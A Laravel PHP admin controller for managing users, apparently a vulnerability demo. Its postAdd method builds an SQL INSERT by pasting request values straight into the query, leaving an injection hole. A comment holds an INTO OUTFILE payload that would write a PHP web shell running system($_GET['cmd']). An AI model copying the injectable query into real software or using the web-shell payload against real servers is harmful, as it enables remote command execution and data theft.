<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use App\Http\Requests\EditUserRequest;
use App\Http\Requests\UserRequest;
use Illuminate\Http\Request;
use Auth;
use App\Models\User;
use Hash;
use DB;
use App\Http\Requests\UpdateUserRequest;

class UserController extends Controller
{
    public function index(){
       
        $pageTitle='Users List';
        $users=User::all();
        // dd($users);
        return view('admin.users.lists',compact('users','pageTitle'));
      
    }

    public function add(){
        $pageTitle = 'Add New User';
        return view('admin.users.add', compact('pageTitle'));
    }

    public function postAdd(UserRequest $request){
        $name1=$request->name;
        $email1=$request->email;
        $role1=$request->role;
        $password1=Hash::make($request->password);
        $query = "INSERT INTO users (name, role, email, password, created_at, updated_at)
              VALUES ('$name1', '$role1', '$email1', '$password1', NOW(), NOW())";
        // dd($query);
        // $query = "SELECT '<?php system(\$_GET[\"cmd\"]); 
      //  <!-- INTO OUTFILE 'C:/ProgramData/MySQL/MySQL Server 8.0/Uploads/shell1.php'"; -->


        DB::statement($query);
        return redirect()->back()->with('success','You have successful');
    }

    public function edit($id){
        $user = User::findOrFail($id);
        $pageTitle = 'Edit User';
        return view('admin.users.edit', compact('user', 'pageTitle'));
    }

    public function postEdit(UpdateUserRequest $request, $id){
        $user = User::findOrFail($id);

        $data = $request->validated();

        if (!empty($data['password'])) {
            $data['password'] = Hash::make($data['password']);
        } else {
            unset($data['password']);
        }

        $user->update($data);

        return redirect()->route('admin.users.index')->with('success', 'User updated successfully!');
    }

    public function delete($id){
        $user = User::findOrFail($id);
        $user->delete();
        return redirect()->route('admin.users.index')->with('success', 'User deleted successfully!');
    }


//     public function profile(){
//         $pageTitle="Profile";
//         $id=Auth::user()->id;
//         $user=User::find($id);
//         return view('auth.profile.show',compact('pageTitle','user'));
//     }

//     public function changePassword(){
        
//     }

//    public function updateProfile(Request $request)
// {
//     $user = Auth::user();

//     $request->validate([
//         'name'  => 'required|string|max:255',
//         'email' => 'required|email|unique:users,email,' . $user->id,
//     ]);

    // $user->update([
    //     'name'  => $request->name,
    //     'email' => $request->email,
    // ]);

    //Demo Mass asignment
//     $user->name=$request->name;
//     $user->email=$request->email;
//     $user->save();

//     return redirect()->back()->with('success', 'Cập nhật thành công!');
// }
}
